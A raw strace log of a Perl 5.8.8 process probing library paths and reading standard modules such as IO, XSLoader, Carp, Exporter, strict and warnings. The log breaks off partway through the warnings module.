12318 07:41:50.068325 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
12318 07:41:50.068370 getppid()         = 12316
12318 07:41:50.068431 stat64("/etc/perl/IO.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.068445 stat64("/etc/perl/IO.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068458 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.068471 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068494 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.068507 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068521 stat64("/usr/lib/perl5/IO.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.068533 stat64("/usr/lib/perl5/IO.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068546 stat64("/usr/share/perl5/IO.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.068558 stat64("/usr/share/perl5/IO.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068571 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.068584 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
12318 07:41:50.068604 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.068618 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.068629 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.068652 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
12318 07:41:50.068709 stat64("/etc/perl/XSLoader.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068725 stat64("/etc/perl/XSLoader.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.068739 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068752 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.068766 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068779 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.068794 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068806 stat64("/usr/lib/perl5/XSLoader.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.068819 stat64("/usr/share/perl5/XSLoader.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068831 stat64("/usr/share/perl5/XSLoader.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.068845 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.068857 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
12318 07:41:50.068878 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.068892 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.068903 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.068921 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
12318 07:41:50.069169 brk(0x8195000)    = 0x8195000
12318 07:41:50.069489 _llseek(8, 3407, [3407], SEEK_SET) = 0
12318 07:41:50.069507 _llseek(8, 0, [3407], SEEK_CUR) = 0
12318 07:41:50.069518 close(8)          = 0
12318 07:41:50.069564 stat64("/etc/perl/Carp.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.069580 stat64("/etc/perl/Carp.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.069594 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.069607 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.069621 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.069634 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.069648 stat64("/usr/lib/perl5/Carp.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.069660 stat64("/usr/lib/perl5/Carp.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.069673 stat64("/usr/share/perl5/Carp.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.069685 stat64("/usr/share/perl5/Carp.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.069698 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.069711 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.069724 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.069738 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
12318 07:41:50.069759 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.069774 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.069785 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.069802 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
12318 07:41:50.070283 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
12318 07:41:50.070311 read(8, "", 4096) = 0
12318 07:41:50.070322 close(8)          = 0
12318 07:41:50.070344 stat64("/etc/perl/Exporter.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.070358 stat64("/etc/perl/Exporter.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.070372 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.070386 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.075502 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.075520 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.075539 stat64("/usr/lib/perl5/Exporter.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.075552 stat64("/usr/lib/perl5/Exporter.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.075565 stat64("/usr/share/perl5/Exporter.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.075578 stat64("/usr/share/perl5/Exporter.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.075591 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.075604 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.075618 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.075631 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
12318 07:41:50.075653 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.075668 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.075680 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.075697 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
12318 07:41:50.076161 _llseek(8, 2217, [2217], SEEK_SET) = 0
12318 07:41:50.076179 _llseek(8, 0, [2217], SEEK_CUR) = 0
12318 07:41:50.076190 close(8)          = 0
12318 07:41:50.076265 stat64("/etc/perl/strict.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076282 stat64("/etc/perl/strict.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076296 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076313 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076327 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076340 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076354 stat64("/usr/lib/perl5/strict.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076366 stat64("/usr/lib/perl5/strict.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076379 stat64("/usr/share/perl5/strict.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076391 stat64("/usr/share/perl5/strict.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076405 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076418 stat64("/usr/lib/perl/5.8/strict.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076431 stat64("/usr/share/perl/5.8/strict.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076444 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
12318 07:41:50.076466 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.076490 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.076502 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.076522 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
12318 07:41:50.076664 _llseek(8, 598, [598], SEEK_SET) = 0
12318 07:41:50.076679 _llseek(8, 0, [598], SEEK_CUR) = 0
12318 07:41:50.076689 close(8)          = 0
12318 07:41:50.076728 stat64("/etc/perl/warnings.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076743 stat64("/etc/perl/warnings.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076757 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076770 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076784 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076797 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076812 stat64("/usr/lib/perl5/warnings.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076824 stat64("/usr/lib/perl5/warnings.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076837 stat64("/usr/share/perl5/warnings.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076849 stat64("/usr/share/perl5/warnings.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076863 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076875 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.076889 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.076902 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
12318 07:41:50.076923 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.076942 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.076953 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.076980 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> 